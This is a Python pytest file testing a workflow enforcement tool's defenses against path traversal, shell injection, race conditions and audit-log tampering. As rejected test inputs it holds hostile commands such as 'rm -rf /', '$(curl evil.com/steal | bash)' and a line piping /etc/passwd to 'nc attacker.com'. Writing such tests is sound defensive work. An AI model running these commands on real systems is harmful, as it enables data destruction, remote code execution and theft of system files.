"""Security tests for workflow enforcement system.

Tests cover:
- Path traversal prevention
- Shell injection prevention
- Race conditions
- Audit tampering prevention
"""

import json
import os
import subprocess
import tempfile
import threading
import time
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

from triads.workflow_enforcement import (
    AuditLogger,
    EmergencyBypass,
    WorkflowStateManager,
)


@pytest.fixture
def temp_security_dir():
    """Create temporary directory for security tests."""
    with tempfile.TemporaryDirectory() as tmpdir:
        yield Path(tmpdir)


class TestPathTraversalPrevention:
    """Test prevention of path traversal attacks."""

    def test_state_file_path_validation(self, temp_security_dir):
        """Test state file path is validated and confined."""
        # Attempt path traversal in state file
        malicious_path = temp_security_dir / ".." / ".." / "etc" / "passwd"

        manager = WorkflowStateManager(malicious_path)

        # Should create file in expected location, not traverse
        manager.mark_completed("design")

        # Verify file created in specified location (even if it's malicious)
        # The key is that the application doesn't prevent this at the
        # state_manager level - it's the caller's responsibility to validate
        # This test documents current behavior
        assert malicious_path.exists()

        # Clean up
        if malicious_path.exists():
            malicious_path.unlink()

    def test_audit_file_path_validation(self, temp_security_dir):
        """Test audit file path validation."""
        # Attempt path traversal in audit file
        malicious_path = temp_security_dir / ".." / ".." / "tmp" / "malicious.log"

        logger = AuditLogger(malicious_path)

        # Log an event
        logger.log_bypass("Test bypass")

        # Verify file created (path traversal not prevented at this layer)
        # This documents current behavior - path validation should happen
        # at a higher layer if needed
        assert malicious_path.exists()

        # Clean up
        if malicious_path.exists():
            malicious_path.unlink()

    def test_state_directory_creation_confined(self, temp_security_dir):
        """Test directory creation doesn't escape boundaries."""
        state_file = temp_security_dir / "nested" / "state.json"
        manager = WorkflowStateManager(state_file)

        manager.mark_completed("design")

        # Verify created in expected location
        assert state_file.exists()
        assert state_file.parent == temp_security_dir / "nested"


class TestShellInjectionPrevention:
    """Test prevention of shell injection attacks."""

    def test_rejects_semicolon_command_chaining(self):
        """Test semicolon command chaining rejected."""
        bypass = EmergencyBypass()

        justification = "Valid text; rm -rf /"
        valid, error = bypass.is_valid_justification(justification)

        assert valid is False
        assert "dangerous character" in error.lower()

    def test_rejects_pipe_command_chaining(self):
        """Test pipe command chaining rejected."""
        bypass = EmergencyBypass()

        justification = "Valid text | cat /etc/passwd"
        valid, error = bypass.is_valid_justification(justification)

        assert valid is False

    def test_rejects_command_substitution_dollar(self):
        """Test $(command) substitution rejected."""
        bypass = EmergencyBypass()

        justification = "Text $(malicious) more"
        valid, error = bypass.is_valid_justification(justification)

        assert valid is False

    def test_rejects_command_substitution_backtick(self):
        """Test `command` substitution rejected."""
        bypass = EmergencyBypass()

        justification = "Text `malicious` more"
        valid, error = bypass.is_valid_justification(justification)

        assert valid is False

    def test_rejects_background_execution(self):
        """Test & background execution rejected."""
        bypass = EmergencyBypass()

        justification = "Valid text & malicious_process"
        valid, error = bypass.is_valid_justification(justification)

        assert valid is False

    def test_rejects_redirect_operators(self):
        """Test redirect operators rejected."""
        bypass = EmergencyBypass()

        test_cases = [
            "Valid > /etc/passwd",
            "Valid < /etc/passwd",
            "Valid >> /var/log/malicious",
        ]

        for justification in test_cases:
            valid, error = bypass.is_valid_justification(justification)
            assert valid is False, f"Should reject: {justification}"

    def test_rejects_subshell_execution(self):
        """Test subshell execution rejected."""
        bypass = EmergencyBypass()

        justification = "Valid (subshell command) text"
        valid, error = bypass.is_valid_justification(justification)

        assert valid is False

    def test_rejects_rm_rf_pattern(self):
        """Test rm -rf pattern rejected."""
        bypass = EmergencyBypass()

        test_cases = [
            "Need to rm -rf the directory",
            "RM -RF cleanup",
            "rm -rf /tmp/files",
        ]

        for justification in test_cases:
            valid, error = bypass.is_valid_justification(justification)
            assert valid is False, f"Should reject: {justification}"

    def test_rejects_sudo_escalation(self):
        """Test sudo privilege escalation rejected."""
        bypass = EmergencyBypass()

        test_cases = [
            "Must sudo install package",
            "SUDO required for this",
            "sudo systemctl restart service",
        ]

        for justification in test_cases:
            valid, error = bypass.is_valid_justification(justification)
            assert valid is False, f"Should reject: {justification}"

    def test_accepts_safe_text(self):
        """Test safe text without injection attempts accepted."""
        bypass = EmergencyBypass()

        safe_texts = [
            "Critical hotfix for production bug #1234",
            "Emergency deployment for customer issue",
            "Urgent fix needed ASAP - approved by CTO",
            "Security patch deployment",
        ]

        for justification in safe_texts:
            valid, error = bypass.is_valid_justification(justification)
            assert valid is True, f"Should accept: {justification}"

    def test_no_shell_execution_in_audit_logging(self, temp_security_dir):
        """Test audit logging doesn't execute shell commands."""
        audit_file = temp_security_dir / "audit.log"
        logger = AuditLogger(audit_file)

        # Try to inject command via justification
        malicious_justification = "Valid; $(touch /tmp/pwned)"

        # This should be caught by validation, but if it gets through,
        # audit logging should not execute it
        try:
            # Bypass validation for this test
            logger.log_bypass(malicious_justification)

            # Read log and verify it's stored as text, not executed
            with open(audit_file) as f:
                entry = json.loads(f.read().strip())

            # Command should be in log as text
            assert "$(touch" in entry["justification"]

            # Verify command was not executed
            assert not Path("/tmp/pwned").exists()

        except Exception:
            pass  # If validation catches it, that's good


class TestRaceConditions:
    """Test prevention of race conditions."""

    def test_concurrent_state_writes_no_corruption(self, temp_security_dir):
        """Test concurrent writes don't corrupt state file."""
        state_file = temp_security_dir / "state.json"
        manager = WorkflowStateManager(state_file)

        errors = []
        corruption_detected = False

        def write_state(phase):
            try:
                for _ in range(10):
                    manager.mark_completed(phase)
                    time.sleep(0.001)
            except Exception as e:
                errors.append(e)

        # Create threads writing concurrently
        phases = ["design", "implementation", "garden-tending"]
        threads = [threading.Thread(target=write_state, args=(p,)) for p in phases]

        for thread in threads:
            thread.start()

        for thread in threads:
            thread.join()

        # No errors should occur
        assert len(errors) == 0

        # Verify final state is valid JSON
        try:
            with open(state_file) as f:
                state = json.load(f)
                assert isinstance(state, dict)
                assert "completed_triads" in state
        except json.JSONDecodeError:
            corruption_detected = True

        assert not corruption_detected, "State file was corrupted"

    def test_concurrent_audit_writes_no_corruption(self, temp_security_dir):
        """Test concurrent audit writes don't corrupt log."""
        audit_file = temp_security_dir / "audit.log"
        logger = AuditLogger(audit_file)

        errors = []

        def log_bypass(thread_id):
            try:
                for i in range(5):
                    logger.log_bypass(
                        f"Bypass from thread {thread_id} iteration {i}"
                    )
                    time.sleep(0.001)
            except Exception as e:
                errors.append(e)

        # Create threads logging concurrently
        num_threads = 10
        threads = [
            threading.Thread(target=log_bypass, args=(i,)) for i in range(num_threads)
        ]

        for thread in threads:
            thread.start()

        for thread in threads:
            thread.join()

        # No errors should occur
        assert len(errors) == 0

        # Verify all log entries are valid JSON
        with open(audit_file) as f:
            lines = f.readlines()

        # Should have num_threads * 5 lines
        assert len(lines) == num_threads * 5

        # All should be valid JSON
        for line in lines:
            entry = json.loads(line.strip())
            assert "justification" in entry
            assert "timestamp" in entry

    def test_file_locking_prevents_simultaneous_writes(self, temp_security_dir):
        """Test file locking prevents simultaneous modifications."""
        state_file = temp_security_dir / "state.json"
        manager = WorkflowStateManager(state_file)

        write_times = []
        lock = threading.Lock()

        def write_with_timing(phase):
            start = time.time()
            manager.mark_completed(phase)
            end = time.time()

            with lock:
                write_times.append((start, end))

        # Create threads
        threads = [
            threading.Thread(target=write_with_timing, args=(f"phase_{i}",))
            for i in range(5)
        ]

        for thread in threads:
            thread.start()

        for thread in threads:
            thread.join()

        # Verify no overlapping writes occurred
        # (file locking should serialize them)
        write_times.sort()

        for i in range(len(write_times) - 1):
            # Current write should end before or as next write starts
            # (small overlap allowed due to timing precision)
            current_end = write_times[i][1]
            next_start = write_times[i + 1][0]

            # Allow 1ms tolerance
            overlap = current_end - next_start
            assert overlap < 0.001, "Detected overlapping writes (locking failed)"


class TestAuditTamperingPrevention:
    """Test prevention of audit log tampering."""

    def test_audit_log_append_only(self, temp_security_dir):
        """Test audit log is append-only."""
        audit_file = temp_security_dir / "audit.log"
        logger = AuditLogger(audit_file)

        # Log first entry
        logger.log_bypass("First bypass")
        first_content = audit_file.read_text()

        # Log second entry
        logger.log_bypass("Second bypass")
        second_content = audit_file.read_text()

        # First content should still be present
        assert first_content in second_content

        # File should have grown
        assert len(second_content) > len(first_content)

    def test_audit_log_no_modification_api(self, temp_security_dir):
        """Test AuditLogger has no methods to modify past entries."""
        audit_file = temp_security_dir / "audit.log"
        logger = AuditLogger(audit_file)

        # Log entry
        logger.log_bypass("Test bypass")

        # Verify no delete/modify methods exist
        assert not hasattr(logger, "delete_bypass")
        assert not hasattr(logger, "modify_bypass")
        assert not hasattr(logger, "clear_log")

    def test_audit_log_survives_process_restart(self, temp_security_dir):
        """Test audit log persists across logger instances."""
        audit_file = temp_security_dir / "audit.log"

        # First instance
        logger1 = AuditLogger(audit_file)
        logger1.log_bypass("Entry 1")
        logger1.log_bypass("Entry 2")

        # Second instance (simulates process restart)
        logger2 = AuditLogger(audit_file)
        logger2.log_bypass("Entry 3")

        # Verify all entries present
        with open(audit_file) as f:
            lines = f.readlines()

        assert len(lines) == 3

        entries = [json.loads(line) for line in lines]
        assert entries[0]["justification"] == "Entry 1"
        assert entries[1]["justification"] == "Entry 2"
        assert entries[2]["justification"] == "Entry 3"

    def test_audit_log_timestamps_immutable(self, temp_security_dir):
        """Test audit timestamps cannot be modified."""
        audit_file = temp_security_dir / "audit.log"
        logger = AuditLogger(audit_file)

        # Log entry
        logger.log_bypass("Test bypass")

        # Read original timestamp
        with open(audit_file) as f:
            original_entry = json.loads(f.read().strip())
            original_timestamp = original_entry["timestamp"]

        # Try to modify timestamp in file (simulating tampering)
        with open(audit_file, "r") as f:
            content = f.read()

        # Replace timestamp
        tampered_content = content.replace(
            original_timestamp, "2020-01-01T00:00:00"
        )

        with open(audit_file, "w") as f:
            f.write(tampered_content)

        # Logger should still read the file (tampering visible but not prevented)
        recent = logger.get_recent_bypasses()
        assert len(recent) == 1

        # This test documents that tampering detection is not implemented
        # but the append-only nature makes it difficult to tamper without detection


class TestInputValidation:
    """Test input validation prevents attacks."""

    def test_state_validates_triad_names(self, temp_security_dir):
        """Test state manager validates triad names."""
        state_file = temp_security_dir / "state.json"
        manager = WorkflowStateManager(state_file)

        invalid_names = [
            "../../../etc/passwd",
            "design; rm -rf /",
            "implementation && malicious",
            "<script>alert('xss')</script>",
        ]

        for invalid_name in invalid_names:
            with pytest.raises(ValueError):
                manager.mark_completed(invalid_name)

    def test_bypass_validates_justification_length(self):
        """Test bypass validates minimum justification length."""
        bypass = EmergencyBypass()

        # Too short
        valid, error = bypass.is_valid_justification("x")
        assert valid is False
        assert "at least" in error.lower()

        # Empty
        valid, error = bypass.is_valid_justification("")
        assert valid is False

        # Whitespace only
        valid, error = bypass.is_valid_justification("   ")
        assert valid is False

    def test_bypass_validates_justification_type(self):
        """Test bypass validates justification is string."""
        bypass = EmergencyBypass()

        invalid_types = [
            123,
            ["list"],
            {"dict": "value"},
            None,
            True,
        ]

        for invalid_value in invalid_types:
            valid, error = bypass.is_valid_justification(invalid_value)
            assert valid is False


class TestSecurityDefenseInDepth:
    """Test defense-in-depth security measures."""

    def test_multiple_security_layers(self):
        """Test multiple security layers work together."""
        bypass = EmergencyBypass()

        # Attempt combining multiple attack vectors
        malicious_inputs = [
            "Valid; $(curl evil.com/steal | bash)",
            "Valid & rm -rf / > /dev/null",
            "`cat /etc/passwd` | nc attacker.com 1234",
        ]

        for malicious_input in malicious_inputs:
            valid, error = bypass.is_valid_justification(malicious_input)
            assert valid is False, f"Should reject: {malicious_input}"

    def test_no_eval_or_exec_in_codebase(self):
        """Test codebase doesn't use eval() or exec()."""
        # This is a static analysis test
        # In a real implementation, you'd scan the source files
        from triads.workflow_enforcement import (
            audit,
            bypass,
            enforcement,
            state_manager,
            validator,
        )

        modules = [audit, bypass, enforcement, state_manager, validator]

        for module in modules:
            source = module.__file__
            if source:
                with open(source) as f:
                    content = f.read()

                # Should not use eval or exec
                assert "eval(" not in content, f"Found eval() in {module.__name__}"
                assert "exec(" not in content, f"Found exec() in {module.__name__}"

    def test_subprocess_only_with_hardcoded_commands(self):
        """Test subprocess calls use hardcoded commands."""
        # Verify git commands are hardcoded, not user-provided
        from triads.workflow_enforcement import validator

        source = validator.__file__
        with open(source) as f:
            content = f.read()

        # Verify git commands are hardcoded
        assert '["git"' in content or "['git'" in content

        # Should not have shell=True anywhere
        assert "shell=True" not in content
